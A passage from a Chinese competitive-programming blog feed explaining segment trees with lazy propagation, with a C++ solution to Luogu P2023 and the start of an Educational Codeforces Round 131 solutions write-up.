    <content type="html"><![CDATA[<p>练一下线段树专题吧，本篇博客持续更新！</p><span id="more"></span><h1 id="线段树"><a href="#线段树" class="headerlink" title="线段树"></a>线段树</h1><p>线段树是算法竞赛中常用的用来维护 <strong>区间信息</strong> 的数据结构。</p><p>线段树可以在 $O(\log N)$ 的时间复杂度内实现单点修改、区间修改、区间查询（区间求和，求区间最大值，求区间最小值）等操作。</p><p>线段树维护的信息在很多时候可以认为是满足（幺）半群的性质的信息。</p><p>一个幺半群 $M=(S,\circ ,e)$，其中 $\circ$ 为在集合 $S$ 上定义的二元运算符，幺半群具有以下性质：</p><ul><li>封闭性：$\forall x\in S$ 和 $\forall y\in S$ 有 $x\circ y\in S$。</li><li>结合律：$\forall x,y,z\in S$ 有 $(x\circ y)\circ z=x\circ (y\circ z)$。</li><li>存在幺元：即 $\exists e\in S$ 满足 $\forall x \in S$ 有 $e\circ x=x$，$e$ 为左幺元；或 $x\circ e=x$，$e$ 为右幺元。</li></ul><p>我们观察到线段树上的信息一般满足这样的性质，一些数域上的加法与乘法自然，考虑二元的 $\max(x,y)$ 运算，此时幺元为 $-\infty$ 也满足这样的性质（一般左右幺元相同时简称为幺元）。</p><p>线段树将每个长度不为 $1$ 的区间划分成左右两个区间递归求解，把整个线段划分为一个树形结构，通过合并左右两区间信息来求得该区间的信息。这种数据结构可以方便的进行大部分的区间操作。</p><p>有个大小为 $5$ 的数组 $a={10,11,12,13,14}$，要将其转化为线段树，有以下做法：设线段树的根节点编号为 $1$，用数组 $d$ 来保存我们的线段树，$d_i$ 用来保存线段树上编号为 $i$ 的节点的值（这里每个节点所维护的值就是这个节点所表示的区间总和）。</p><p>我们先给出这棵线段树的形态，如图所示：</p><p><img src="/2022/07/21/%E7%BA%BF%E6%AE%B5%E6%A0%91%E4%B8%93%E9%A2%98%E8%AE%AD%E7%BB%83/segt1.svg"></p><p>图中每个节点中用红色字体标明的区间，表示该节点管辖的 $a$ 数组上的位置区间。如 $d_1$ 所管辖的区间就是 $[1,5]$（$a_1,a_2, \cdots ,a_5$），即 $d_1$ 所保存的值是 $a_1+a_2+ \cdots +a_5$，$d_1=60$ 表示的是 $a_1+a_2+ \cdots +a_5=60$。</p><p>通过观察不难发现，$d_i$ 的左儿子节点就是 $d_{2\times i}$，$d_i$ 的右儿子节点就是 $d_{2\times i+1}$。如果 $d_i$ 表示的是区间 $[s,t]$（即 $d_i=a_s+a_{s+1}+ \cdots +a_t$) 的话，那么 $d_i$ 的左儿子节点表示的是区间 $[ s, \frac{s+t}{2} ]$，$d_i$ 的右儿子表示的是区间 $[ \frac{s+t}{2} +1,t ]$。</p><p>在实现时，我们考虑递归建树。设当前的根节点为 $p$，如果根节点管辖的区间长度已经是 $1$，则可以直接根据 $a$ 数组上相应位置的值初始化该节点。否则我们将该区间从中点处分割为两个子区间，分别进入左右子节点递归建树，最后合并两个子节点的信息。（以上来自wiki）</p><p>在进行区间操作的时候，我们一般不会把状态更新到每个节点，如果更新，那么一次操作最大的复杂度会是 $O(n)$。因此我们会采取懒惰标记的方式去记录这次的操作，如果这次更新完整地包含了一个区间，那么我们对这个区间打上懒惰标记，不继续往下更新，若要查询，则会将懒惰标记加到对应的节点上去。可以证明，每一次操作不会超过4个区间，加上区间操作是从上往下延的，那么一次操作理论最坏的情况应该是 $O(log_2n)$，非常符合我们的要求。查询复杂度同理，也是 $O(log_2n)$。</p><p>这里需要注意几点：</p><h2 id="懒惰标记怎么打？"><a href="#懒惰标记怎么打？" class="headerlink" title="懒惰标记怎么打？"></a>懒惰标记怎么打？</h2><p>当当前区间完全包含于我要操作的区间，这个时候可能会有点疑问，这个区间的值我是加或者不加，我的懒惰标记肯定会给到这个区间，但是这个值加不加，懒惰标记给到了，那么一个区间带了一个懒惰标记，它的值到底是意味着加了还是没加呢？因为感觉理论上好像都可行的，但是这里实际情况是：要加！因为我区间的值会被更新到父亲节点，如果我不加，那么更新上去的节点值就是错误的。因此此时我一定要把值加上去。那么一个区间带了懒惰标记它的含义是：我自己的值已经加上去了，但是我的儿子区间和孙子，曾孙子区间都没加上这个值，等会过来的时候都需要加上，那么带了懒惰标记的那个区间是已经加上了的。</p><p>所以懒惰标记什么含义一定要搞清楚，不能模棱两可，不能，不能！！！</p><h2 id="什么时候push-down"><a href="#什么时候push-down" class="headerlink" title="什么时候push down"></a>什么时候push down</h2><p>懒惰标记下传的操作我们叫 <code>push_down</code>。什么时候需要呢？我们理解了懒惰标记的含义之后，我们就清楚了，带了懒惰标记的区间，本身已经加上了值，只是儿子都没加上去。那么如果我直接再对整个区间操作，需不需要 <code>push_down</code> 呢？不需要，因为这个区间已经是真实值了，但是我在对一个带有懒惰标记的区间的儿子区间尝试进行操作的时候呢？那肯定需要了！因为儿子区间还不是真实值，还得加上父亲给它的懒惰标记才是。</p><p>那么我们 <code>push_down</code> 一次就会把一个区间的懒惰标记清零，给对应的两个儿子区间加上对应的值，并把懒惰标记分发给他们。</p><h1 id="练习题"><a href="#练习题" class="headerlink" title="练习题"></a>练习题</h1><h2 id="P2023-AHOI2009-维护序列"><a href="#P2023-AHOI2009-维护序列" class="headerlink" title="P2023 [AHOI2009] 维护序列"></a>P2023 [AHOI2009] 维护序列</h2><h3 id="题目背景"><a href="#题目背景" class="headerlink" title="题目背景"></a>题目背景</h3><p>老师交给小可可一个维护数列的任务，现在小可可希望你来帮他完成。</p><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>有一个长为 $n$ 的数列 ${a_n}$，有如下三种操作形式：</p><ol><li>格式 <code>1 t g c</code>，表示把所有满足 $t\le i\le g$ 的 $a_i$ 改为 $a_i\times c$ ;</li><li>格式 <code>2 t g c</code> 表示把所有满足 $t\le i\le g$ 的 $a_i$ 改为 $a_i+c$ ;</li><li>格式 <code>3 t g</code> 询问所有满足 $t\le i\le g$ 的 $a_i$ 的和，由于答案可能很大，你只需输出这个数模 $p$ 的值。</li></ol><h3 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h3><p>第一行两个整数 $n$ 和 $p$。</p><p>第二行含有 $n$ 个非负整数，表示数列 ${a_i}$ 。</p><p>第三行有一个整数 $m$，表示操作总数。</p><p>从第四行开始每行描述一个操作，同一行相邻两数之间用一个空格隔开，每行开头和末尾没有多余空格。</p><h3 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h3><p>对每个操作 3，按照它在输入中出现的顺序，依次输出<strong>一行一个整数</strong>表示询问结果。</p><h3 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h3><h4 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">7 43</span><br><span class="line">1 2 3 4 5 6 7</span><br><span class="line">5</span><br><span class="line">1 2 5 5</span><br><span class="line">3 2 4</span><br><span class="line">2 3 7 9</span><br><span class="line">3 1 3</span><br><span class="line">3 4 7</span><br></pre></td></tr></table></figure><h4 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2</span><br><span class="line">35</span><br><span class="line">8</span><br></pre></td></tr></table></figure><h3 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h3><h4 id="样例输入输出-1-解释"><a href="#样例输入输出-1-解释" class="headerlink" title="样例输入输出 1 解释"></a>样例输入输出 1 解释</h4><ul><li>初始时数列为 ${1,2,3,4,5,6,7}$。</li><li>经过第 $1$ 次操作后，数列为 ${1,10,15,20,25,6,7}$。</li><li>对第 $2$ 次操作，和为 $10+15+20=45$，模 $43$ 的结果是 $2$。</li><li>经过第 $3$ 次操作后，数列为 ${1,10,24,29,34,15,16}$。</li><li>对第 $4$ 次操作，和为 $1+10+24=35$，模 $43$ 的结果是 $35$。</li><li>对第 $5$ 次操作，和为 $29+34+15+16=94$，模 $43$ 的结果是$8$。</li></ul><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><p>测试数据规模如下表所示：</p><table><thead><tr><th align="center">数据点编号</th><th align="center">1</th><th align="center">2</th><th align="center">3</th><th align="center">4</th><th align="center">5</th><th align="center">6</th><th align="center">7</th><th align="center">8</th><th align="center">9,10</th></tr></thead><tbody><tr><td align="center">$n=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr><tr><td align="center">$m=$</td><td align="center">$10$</td><td align="center">$1000$</td><td align="center">$1000$</td><td align="center">$10000$</td><td align="center">$60000$</td><td align="center">$70000$</td><td align="center">$80000$</td><td align="center">$90000$</td><td align="center">$100000$</td></tr></tbody></table><p>对于全部的测试点，保证 $0 \leq p, a_i, c \leq 10^9$，$1 \leq t \leq g \leq n$。</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>是一个线段树的翻版题，只不过要取模，并且有乘法，乘法其实跟加法一样，如果区间里的数都乘上一个数，那么其实就相当于先和再乘，乘法懒惰标记默认应该为1。因为既有加法也有乘法，因此我们需要两个懒惰标记，当懒惰标记乘上去时，加法的懒惰标记应该对应要乘上去，在push_down的时候，我们先乘，再加即可。</p><h2 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> n,p;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">e</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l;</span><br><span class="line">    <span class="keyword">int</span> r;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">    <span class="keyword">int</span> lazy1;</span><br><span class="line">    <span class="keyword">int</span> lazy2;</span><br><span class="line">&#125;tree[maxn&lt;&lt;<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> now,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    tree[now].l=l;</span><br><span class="line">    tree[now].r=r;</span><br><span class="line">    tree[now].lazy1=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        tree[now].sum=a[r];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=l+r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>,l,mid);</span><br><span class="line">    <span class="built_in">build</span>(now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    tree[now].sum=(tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum)%p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add_lazy</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> lazy1,<span class="keyword">int</span> lazy2)</span></span>&#123;</span><br><span class="line">    tree[i].sum*=lazy1;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].sum+=(tree[i].r-tree[i].l+<span class="number">1</span>)*lazy2;</span><br><span class="line">    tree[i].sum%=p;</span><br><span class="line">    tree[i].lazy1*=lazy1;</span><br><span class="line">    tree[i].lazy2*=lazy1;</span><br><span class="line">    tree[i].lazy1%=p;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">    tree[i].lazy2+=lazy2;</span><br><span class="line">    tree[i].lazy2%=p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">push_down</span><span class="params">(<span class="keyword">int</span> i)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> lazy1=tree[i].lazy1,lazy2=tree[i].lazy2;</span><br><span class="line">    tree[i].lazy1=<span class="number">1</span>;</span><br><span class="line">    tree[i].lazy2=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">    <span class="built_in">add_lazy</span>(i&lt;&lt;<span class="number">1</span>|<span class="number">1</span>,lazy1,lazy2);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="comment">//printf(&quot;query(%lld,%lld,%lld)\n&quot;,l,r,now);</span></span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        ans+=tree[now].sum;</span><br><span class="line">        <span class="comment">//printf(&quot;sum=%d\n&quot;,tree[now].sum);</span></span><br><span class="line">        ans%=p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">query</span>(l,r,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,<span class="number">1</span>,num);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].l+tree[now].r&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">add</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mul</span><span class="params">(<span class="keyword">int</span> l,<span class="keyword">int</span> r,<span class="keyword">int</span> num,<span class="keyword">int</span> now)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(l&lt;=tree[now].l&amp;&amp;r&gt;=tree[now].r)&#123;</span><br><span class="line">        <span class="built_in">add_lazy</span>(now,num,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">push_down</span>(now);</span><br><span class="line">        <span class="keyword">int</span> mid=tree[now].r+tree[now].l&gt;&gt;<span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span>(l&lt;=mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>(r&gt;mid)<span class="built_in">mul</span>(l,r,num,now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>);</span><br><span class="line">        tree[now].sum=tree[now&lt;&lt;<span class="number">1</span>].sum+tree[now&lt;&lt;<span class="number">1</span>|<span class="number">1</span>].sum;</span><br><span class="line">        tree[now].sum%=p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;n,&amp;p);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,a+i);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">build</span>(<span class="number">1</span>,<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">signed</span> q;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;q);</span><br><span class="line">    <span class="keyword">while</span>(q--)&#123;</span><br><span class="line">        <span class="keyword">signed</span> op,l,r,num;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;op);</span><br><span class="line">        <span class="keyword">if</span>(op==<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">mul</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(op==<span class="number">2</span>)&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>,&amp;l,&amp;r,&amp;num);</span><br><span class="line">            <span class="built_in">add</span>(l,r,num,<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>,&amp;l,&amp;r);</span><br><span class="line">            ans=<span class="number">0</span>;</span><br><span class="line">            <span class="comment">//printf(&quot;l=%d r=%d\n&quot;,l,r);</span></span><br><span class="line">            <span class="built_in">query</span>(l,r,<span class="number">1</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%lld\n&quot;</span>,ans);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;练一下线段树专题吧，本篇博客持续更新！&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="数据结构" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    <category term="线段树" scheme="http://example.com/categories/icpc/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/%E7%BA%BF%E6%AE%B5%E6%A0%91/"/>
    
    
  </entry>
  
  <entry>
    <title>Educational Codeforces Round 131(Div.2)解析</title>
    <link href="http://example.com/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/"/>
    <id>http://example.com/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/</id>
    <published>2022-07-08T16:02:00.000Z</published>
    <updated>2022-07-09T00:59:37.382Z</updated>
    
    <content type="html"><![CDATA[<p>今天掉大分，预估回青名吧。实时<a href="https://www.bilibili.com/video/BV1KN4y1u7qB">录屏</a></p><span id="more"></span><h2 id="A-Grass-Field"><a href="#A-Grass-Field" class="headerlink" title="A. Grass Field"></a>A. Grass Field</h2><h3 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/1.png" alt="1"></p><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>给定2×2的草地，一次操作能任意清除三块草地，问最多几次清除所有草地。那就判断草地个数，只有全是草地的时候才要两次，没有草地的时候一次不用，其余情况都是一次。</p><h3 id="标程"><a href="#标程" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 500002</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod=<span class="number">1e9</span>+<span class="number">7</span>;</span><br><span class="line"><span class="keyword">int</span> dx[]=&#123;<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;,dy[]=&#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>&#125;;</span><br><span class="line">queue&lt;pair&lt;<span class="keyword">int</span>,<span class="keyword">int</span>&gt;&gt;q;<span class="comment">//y,x</span></span><br><span class="line"><span class="keyword">int</span> n,m;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>,a,a+<span class="number">1</span>,a+<span class="number">2</span>,a+<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">int</span> sum=a[<span class="number">1</span>]+a[<span class="number">2</span>]+a[<span class="number">3</span>]+a[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">if</span>(sum==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(sum!=<span class="number">4</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">//init();</span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="B-Permutation"><a href="#B-Permutation" class="headerlink" title="B. Permutation"></a>B. Permutation</h2><h3 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h3><p><img src="/2022/07/09/Educational%20Codeforces%20Round%20131(Div.2)/2.png" alt="2"></p><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><p>就是说，我们需要让排列中的一个值（这个值是<code>a[i+1]/a[i]</code>）尽可能多的出现，一样多的情况下输出值较大的。这题贪就完了，我们长度超过4的我们就选2。从1开始2倍去填上数，再选没填过的，也是2倍2倍输出，这样就达到了最优状态。</p><h3 id="标程-1"><a href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span 